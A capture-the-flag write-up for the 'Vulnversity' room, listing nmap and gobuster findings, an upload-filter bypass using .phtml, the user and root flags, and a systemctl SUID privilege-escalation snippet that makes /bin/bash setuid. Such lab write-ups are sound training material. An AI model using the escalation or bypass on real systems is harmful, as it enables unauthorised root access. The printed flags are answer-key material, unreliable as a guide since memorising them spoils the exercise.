# Notes for the room "Vulnversity"

## Tasks 

### Task 2
(See the nmap folder for details)


Scan the box, how many ports are open?

```
Answer: 6
```

What version of the squid proxy is running on the machine?

```
3.5.12
```

How many ports will nmap scan if the flag -p-400 was used?

```
400
```

Using the nmap flag -n what will it not resolve?

```
DNS
```

What is the most likely operating system this machine is running?

```
Ubuntu
```

What port is the web server running on?

```
3333
```

### Task 3

What is the directory that has an upload form page?

Command:
```
└─$ gobuster dir -u http://10.10.195.42:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt                 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.195.42:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/27 10:33:03 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.195.42:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.195.42:3333/css/]   
/js                   (Status: 301) [Size: 316] [--> http://10.10.195.42:3333/js/]    
/fonts                (Status: 301) [Size: 319] [--> http://10.10.195.42:3333/fonts/] 
/internal             (Status: 301) [Size: 322] [--> http://10.10.195.42:3333/internal/]
Progress: 15361 / 220561 (6.96%)                                                       ^C
[!] Keyboard interrupt detected, terminating.
                                                                                        
===============================================================
2021/05/27 10:33:59 Finished
===============================================================
                                                                   
```

Answer:

```
/internal/
```

### Task 4

Try upload a few file types to the server, what common extension seems to be blocked?

```
.php
```

Run this attack, what extension is allowed?

```
.phtml
```

What is the name of the user who manages the webserver?

```
bill
```

What is the user flag?

```
8bd7992fbe8a6ad22a63361004cfcedb
```

### Task 5

On the system, search for all SUID files. What file stands out?

Used this command:

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

Answer:

```
/bin/systemctl
```

Become root and get the last flag (/root/root.txt)

Used the exploit like this:

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Then just type `bash -p` and you are root

Answer:

```
a58ff8579f0a9270368d33a9966c7fd5
```
